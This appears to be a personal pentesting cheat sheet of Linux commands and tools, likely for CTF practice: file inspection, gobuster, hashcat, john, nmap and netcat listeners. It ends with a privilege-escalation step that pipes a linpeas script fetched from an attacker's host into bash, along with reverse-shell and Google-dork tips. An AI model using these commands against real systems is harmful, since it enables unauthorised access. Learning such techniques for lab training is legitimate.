# Commands and tips

| **Commands**  | Function | + details | optional arguments |
| --- | --- | --- | --- |
| $(<command>) | first executes what is between parentheses, and the output is passed as a parameter to the command outside the parentheses |  |  |
| ; | Even if the first command fails, the second is executed. | Separates **several commands that are executed one after another**, regardless of the result of the previous one |  |
| | | Send the output from the first command to the second | Connects the output of one command to the input of the next. | `xargs` The output of the first argument is set as a parameter in the second |
| >/>> | Output redirect | Use > to overwrite a file, and >> to append to the end |  |
| —help | help with command arguments |  |  |
| && | Run the second command if the first was successful |  |  |
| || | If command1 fails, then command 2 is executed. |  |  |
| 7z | decompress files | NOTE: sometimes unzip works better with hidden files than 7z | `e` <filename> “<exact path where you want to decompress>” extracts anything inside a rar file, even if `x` doesn't work. `x` decompresses the file. `l -slt` lists the contents of the compressed file |
| alias | to create or view aliases for commands locally |  | `\<alias\>=“command to execute”` this changes it locally; if you want it to work for any shell, you have to go to the `.zshrc` file |
| binwalk | extract information from a file |  |  |
| cat | obtain information from a file | jpg, text, e-mail... anything that is not a directory | `./\<strange_name\>` `./--spaces\\ in\\ this\\ filename--` to open files with spaces, put \ before each space |
| cd | move from one directory to another | .. to go to the previous one or ./ to move to the next one, cd to go to the main one | ./--SecretFile--.txt new_name.txt |
| cewl | create custom dictionaries based on websites |  | `-w` output file `-d` depth |
| checksec | check for potential vulnerabilities in a binary |  | gives you info on whether the canary is enabled, PIE, etc. |
| chmod | change file permissions | o(owner) r(read) w(write) x(execute) | Permissions are granted to the owner first, then to the group, and then to others. Each permission is a power of 2, e.g., a 7 would give rwx permissions. Add `+` <letter> to add permissions. `u+` to change permissions for the user who created it `-` to remove permissions |
| cp | copy a directory or file |  |  |
| curl | make web requests | [https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status) | `-s` prevents it from showing you the connection process, `X` #indicates the method you want to use, if you want to make the format look nice, add `| jq`  , `-v` to see the server response, `—cookie`     allows you to set the cookie you want  , `—header`    allows you to change the type of file you use, e.g.: “Content-Type: application/json”, `--data` ‘{‘email’:“test@2million.htb”}’ to include parameters requested by the API`-I` sends a HEAD request (as we will see in the next section), while `-i` sends any request we specify and prints the headers as well. |
| cupp | custom dictionaries |  | `-i` interactive mode for entering data `leetmode` if it swaps and tests letters with numbers `-w` DO NOT combine with `-i` , makes changes to a wordlist: `leetmode` , special characters, join words, random numbers at the end... |
| dirb | dictionary attack on a website | dirbuster similar to gobuster |  |
| dig | like nslookup but more powerful |  |  |
| docker | launch mini virtual machines |  | `exec -it \<id\> \\bin\\bash` connect to a docker container `docker ps`  see the container IDs `docker-compose build` you have to be in the same directory as the .yml and build the container `docker-compose up` launch the container and allow access to it |
| echo | replicate text |  | `“<IP> <domain without HTTP/[HTTPS://\](HTTPS://)>” \| sudo tee -a /etc/hosts`  |
| echo “ ” | sudo tee -a | write to a file |  | /etc/hosts              is where the host file is normally located |
| exiftool | displays non-standard metadata and groups it by type |  | `name.jpg -u -a -g1` |
| fcrackzip | to create a zip file and force it |  |  |
| file | to find out what type of file you are working with |  | `-- ./\*` to view the file type of an entire directory, if you want to filter by a specific name `-- ./\<name\>\*` |
| find | search for files and directories on the system | you have to be inside the directory itself to find it [https://man7.org/linux/man-pages/man1/find.1.html](https://man7.org/linux/man-pages/man1/find.1.html) |  `-type d -not -empty`  view non-empty folders in a directory `-name “\<rare_name\>”` to search for specific names `-type f` → regular files only. `-size 1033c` → size exactly **1033 bytes** (`c` = bytes).`! -executable` → **not** executable. `/\*` lists all files in a directory `2\>/dev/null` to clear the permission denied output `-user` specifies the owner user `-group` `-name *<string to search for>*` to avoid having to look for something exact, but rather for matches |
| gcc | create the executable for a file in Linux | independent of the original programming language | `-O` and indicate the executable to compile `-g` put everything for debugging, function names, variables... `-s` to not save any symbols `-Onº` how much you want it to optimize something |
| get | extract a file from a directory |  |  |
| git clone | to install anything from a GitHub repository |  | <url> |
| gobuster | generally used to attack websites | check the server that is running; sometimes specific directories are not in the wordlist and it works more effectively | `vhost -vv -k --append-domain -u` [https://futurevera.thm/] (https://futurevera.thm/)`\<URL\> -w /usr/share/wordlists/dirb/common.txt -o sub-gob2 \| grep Found`  `-w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt` # look at web subdomains, which is what you put before whatever.htb  `dir --url` [http://10.129.1.15/] (http://10.129.1.15/) `--wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` #look at different directories    `-H “Cookie: ”` add a cookie    `x php,html` tells Gobuster to append `.php` and `.html` extensions to each word in the wordlist. |
| grep | search for specific text | no need to run cat beforehand | `-RIn` # Search for text “flag” within files (recursive, shows name and line) `“<text to search for>” <file name>` |
| hashcat | break hashes, you have to wait even if it says exhausted or different options appear, it is still running in the background | [https://hashes.com/en/tools/hash_identifier](https://hashes.com/en/tools/hash_identifier) to identify the type of hash we have [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) to see the mode we want [https://hashcat.net/wiki/doku.php?id=rule_based_attack] (https://hashcat.net/wiki/doku.php?id=rule_based_attack) to look at the rules | `-a 3 -m 1400 -O` `-O` is the high-performance mode, with `-a 0` dictionary attacks are performed, `-m` is used to choose the type of hash to break.  The argument will always be: `-a number -m number \<txt file with the hash/hash\> ‘mask?a?d’`  the mask is if you are given any clues as to how the hash should appear `?a/?d` means that after that word there could be any letter `a` or a number `d` , to create your own mask `-1 '? x?x'` and combine several modes. The rules are used to modify dictionaries/input data with `-r`. `--show` displays the cracked hashes. |
| ifconfig | to see a machine's IP address |  |  |
| john | crack hashes | `zip2john` extract hash from a zip file `pdf2john` extract hash from a pdf file `office2john` extract hash from an office file | [`flag.zip](http://flag.zip) > hash.txt` to extract the hash or whatever is in hash.txt`w=/usr/share/wordlist/rockyou.txt hash.txt` specify a wordlist`john --show hash.tx`  |
| ls | see what's inside a directory | ll | `-lshA` to see permissions, hidden files, actions, extensions |
| man | command manual |  | <COMMAND> |
| mkdir | create directories |  |  |
| msfvenom | reverse shell |  |  |
| mv | rename a file or move it to another directory | if you see a command or something strange: ‘’ | filename newdirectory/ |
| nano | text editor |  |  |
| nc | used for reverse shell | You leave a specific port listening on the host and wait for the victim machine to fall into the trap and give you shell access | `-lvnp` <port> |
| nikto | view vulnerabilities on a web page |  |  |
| nmap | search for vulnerabilities | which port is open and which OS is being used. | `-p- --min-rate 1000 -sV -vvv -T5 -Pn` , `--min…` and `-T\<nº\>` to control the time between sending one packet and the next , `-p-`: to search all ports, `-o allPorts.text` : exports the nmap result to a file of your choice, `-sV` to find out the version and scan the services, `-sC` to run a malicious script, `-vvv` to see what nmap is doing, `-sU` to scan UDP (by default it does TCP) |
| nslookup | DNS queries |  | `-type=PTR` finds the domain given an IP address. This is used to **query the PTR record (reverse DNS)**, i.e., to try to obtain the **domain name associated with an IP address**. In this case, you are asking for the IP address `128.238.29.22` (the order is reversed in PTR queries). `NXDOMAIN` literally means **“Non-Existent Domain”** → “the domain does not exist.” |
| pdfinfo | extract information from a file |  |  |
| ping | checks whether a specific IP address responds to messages sent from our machine | to find out if we have a secure connection to the computer we are attacking | IP of the computer to attack `-c` indicates the number of pings you want to execute|
| pwd | which directory you are in | print working directory |  |
| pwndbg | to analyze a binary dynamically |  | `b <function_name>` set a breakpoint in a function `finish` end the execution of the function you are running `n` to run the functions one by one `c` continue execution `q` exit |
| respond | If I am on Windows on a local network for a service and respond is active, it tells you what it is and to connect to it |  |  |
| rm | delete a file | dir for directories | -r to also remove everything inside |
| scp | copy files from one machine to another |  |  |
| ssh | open a remote connection from one machine to another |  | user@ip (ip is the IP address we want to reach) |
| steghide embed | embed info inside another file |  |  |
| string | returns all printable text strings |  |  |
| sudo | lets you change the user |  | `apt-get install`  to install something, `su` to become superadmin (also works as a command if you want to be a user), `-V` to see the version of sudo you are using, useful for exploiting vulnerabilities |
| touch | create files |  |  |
| unzip | decompress files |  | `-- “\<filename\>”` extract a specific file from a zip file |
| vi | text editor |  |  |
| vol | analyze RAM memory dumps |  | `-f \<file\> PLUGIN` cmdline, hashdump, [windows.info](http://windows.info) |
| wc | count words |  | `-l` if you only want to count lines |
| which | view full path to a file |  |  |
| xxd | extract information from a file and identify its contents | magic bytes to edit them with the `hexeditor` command | `-p` prints the hex dump in plain format |
| zsteg | look at the least significant bytes of an image and convert them to text |  |  |
- [www.revshells.com](http://www.revshells.com) → like metaxploit but as an online service
- `/usr/share/wordlists`
- `/dev/null` is a black hole; whatever you send there disappears
- `2` error codes are usually type 2
- In Parrot, you don't need the ‘open’ command to open an app
- In bash, in loops, `;`  are like line breaks
- `.` indicates that a file is hidden or should be hidden
- In `\$PATH`, `:` means a new path
- `.zshrc` to modify things to run when opening a shell, such as aliases
- watchtowerlabs → website about modern cyber vulnerabilities
  
Escalate privileges

1. From the attacking machine
- Start an HTTP server: sudo python3 -m http.server 8000
1. Connect to the victim's shell
- Enter: curl [http://tu_ip_maquina_atacante:puerto_seleccionado/linpeas.sh](http://tu_ip_maquina_atacante:puerto_seleccionado/linpeas.sh) | bash
- “Index of” inurl: → search for exposed LFI from Google
- robots.txt → look for subdomains that do not want to be indexed
- org:“” → services exposed on the Internet
- POC → proof of concept, is to search for GitHub repositories with the .py that directly exploit the CVE
